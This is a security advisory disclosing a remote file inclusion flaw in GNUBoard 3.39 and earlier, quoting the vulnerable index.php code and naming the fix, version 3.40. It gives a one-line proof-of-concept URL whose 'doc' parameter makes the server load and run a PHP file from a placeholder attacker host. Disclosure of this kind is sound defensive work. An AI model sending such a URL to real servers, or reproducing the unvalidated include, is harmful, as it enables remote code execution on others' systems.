```text
### STG Security Advisory: [SSA-20041214-14] GNUBoard PHP injection vulnerability

**Vulnerability Class:**
Implementation Error: Input validation flaw

**Impact:**
High: arbitrary command execution.

**Affected Products:**
GNUBoard 3.39 and prior versions
php.ini: register_globals = On

**Root Cause:**
Improper verification of input value of the parameter "doc" in "index.php".

**Attack Vector:**
By manipulating the "doc" parameter in "index.php," a malicious attacker can include arbitrary files from external or local resources, leading to arbitrary command execution with the privileges of the HTTPD process.

**Vulnerability Details:**
The code in `index.php` does not properly validate the "doc" parameter before including it.

```php
if (!$doc) {  (1) <-- check point
    $doc = './main.php';
}

// php ??? ??? ??? ? ??
$tmp = explode(".", $doc);
$extension = $tmp[count($tmp)-1];
if (!preg_match("/^(php[[3]](#3)?|[p]?htm[l]?)$/i", $extension) || count($tmp)<=1)
{
    echo "php php3 htm html phtml ??? ??? ? ????.";
    exit;
}
......
ob_start();
include $doc; (2) <-- include point
```

**Exploitation:**
An attacker can specify a URL to a malicious PHP file using the "doc" parameter, which will then be included and executed by the server.

**Proof of Concept:**
`http://[victim]/gnu3/index.php?doc=http://[attacker]/[attack].php`

**Solution:**
Update to GNUBoard 3.40
```